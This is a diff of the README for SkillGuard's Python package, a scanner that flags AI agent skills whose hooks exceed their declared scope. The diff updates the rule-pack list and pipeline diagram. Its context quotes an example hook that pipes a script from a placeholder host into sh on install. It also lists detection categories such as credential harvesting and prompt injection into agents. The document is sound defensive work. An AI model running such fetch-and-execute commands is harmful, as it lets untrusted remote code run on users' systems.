@@ -20,7 +20,7 @@ that runs `curl https://get.example.invalid/setup.sh | sh` the moment the
 skill is installed -- nothing in most agent frameworks checks that the
 declared scope matches what the hooks actually do. SkillGuard is that check:
 a CLI, a library, and (for the npm distribution) a GitHub Action, all
-reading the same seven bundled rule packs. This package is the Python
+reading the same bundled rule packs. This package is the Python
 distribution -- a genuine, independent port, not a wrapper around the
 Node binary.
 
@@ -36,9 +36,9 @@ or with [uv](https://docs.astral.sh/uv/):
 uv add skillguard-cli
 ```
 
-No separate install step, no external binary to fetch: all seven rule packs
-and the pattern-matching engine ship inside the wheel. The complementary
-JS/TS distribution installs the same way on the npm side:
+No separate install step, no external binary to fetch: all bundled rule
+packs and the pattern-matching engine ship inside the wheel. The
+complementary JS/TS distribution installs the same way on the npm side:
 `npm install --save-dev skillguard-cli` (or `npx skillguard-cli scan` to
 run it once without installing) -- see the
 [project README](https://github.com/RudrenduPaul/skillguard#readme) for
@@ -122,20 +122,24 @@ their own CLIs use.
 
 ```
 target path -> .skillguardignore (opt-in only) -> file walker
-   -> rule-pack loader (7 packs: SG01-SG07)
-   -> pattern engine (SG01-06, partial SG05) + structural check (SG07)
+   -> rule-pack loader (SG01-SG08, SG10 -- SG09 not yet ported)
+   -> pattern engine (SG01-06, partial SG05)
+      + structural checks (SG07, SG08, SG10)
    -> inline suppression filter (opt-in only)
    -> severity threshold -> exit code (0 clean / 1 fail / 2 error)
 ```
 
 Findings, warnings, and the exit-code contract are described in full in
 [docs/concepts.md](https://github.com/RudrenduPaul/skillguard/blob/main/docs/concepts.md).
-The seven rule packs (SG01 network mismatch, SG02 remote code execution,
-SG03 file-scope escalation, SG04 hook supply-chain, SG05 obfuscated
-payloads, SG06 credential harvesting, SG07 frontmatter spoofing) are
-reimplemented as genuine Python logic against the same rule-pack contract
-the npm package uses -- see that same doc for what each one actually
-catches.
+Nine of the ten rule packs (SG01 network mismatch, SG02 remote code
+execution, SG03 file-scope escalation, SG04 hook supply-chain, SG05
+obfuscated payloads, SG06 credential harvesting, SG07 frontmatter
+spoofing, SG08 prompt injection via skill content, SG10 marketplace
+typosquatting) are reimplemented as genuine Python logic against the same
+rule-pack contract the npm package uses -- see that same doc for what each
+one actually catches. SG09 (cross-skill privilege chaining) doesn't yet
+have a Python port of its own detection logic, though `scan_skill_set()`
+is available in this package.
 
 ## How SkillGuard compares
 
